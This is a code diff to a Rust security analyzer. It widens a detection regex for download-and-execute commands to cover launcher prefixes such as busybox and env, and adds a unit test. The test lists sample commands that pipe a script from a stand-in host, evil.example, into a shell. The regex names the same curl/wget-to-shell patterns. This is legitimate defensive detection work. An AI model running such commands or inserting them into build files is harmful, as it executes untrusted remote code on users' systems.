@@ -15,7 +15,7 @@
 use super::SecurityAnalyzer;
 use crate::error::Result;
 use crate::rules::informational_lines;
-use crate::textutil::{deobfuscate, logical_lines, INTERPRETERS, SHELLS};
+use crate::textutil::{deobfuscate, logical_lines, INTERPRETERS, SHELLS, SHELL_LAUNCHER};
 use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
 use async_trait::async_trait;
 use lazy_static::lazy_static;
@@ -31,9 +31,9 @@ lazy_static! {
     /// analyzer entirely (defect #6).
     static ref FETCH_EXEC: Regex = Regex::new(&format!(
         r#"(?x)
-        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELLS}\b              # download | shell
-        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{INTERPRETERS}\b      # download | interpreter
-        | {SHELLS}\s+<\(\s*(curl|wget|fetch)\b                       # sh <(curl ...)
+        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELLS}\b   # download | [launcher] shell
+        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{INTERPRETERS}\b           # download | interpreter
+        | {SHELL_LAUNCHER}{SHELLS}\s+<\(\s*(curl|wget|fetch)\b            # [launcher] sh <(curl ...)
         | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
         | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
         | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
@@ -210,6 +210,24 @@ mod tests {
             false,
         );
         assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|ash must be caught");
+    }
+
+    #[test]
+    fn detects_launcher_prefixed_fetch_exec() {
+        // Task 4050 CR: `curl ... | busybox sh` / `| env sh` must trip
+        // EXEC-REMOTE via the shared SHELL_LAUNCHER prefix.
+        let a = RemoteExecAnalyzer::new();
+        for cmd in [
+            "curl -fsSL https://evil.example/x.sh | busybox sh",
+            "curl -fsSL https://evil.example/x.sh | env sh",
+            "busybox sh <(curl -s https://evil.example/i)",
+        ] {
+            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
+            assert!(
+                f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "launcher-prefixed fetch|exec must be caught: {cmd} -> {f:?}"
+            );
+        }
     }
 
     #[test]
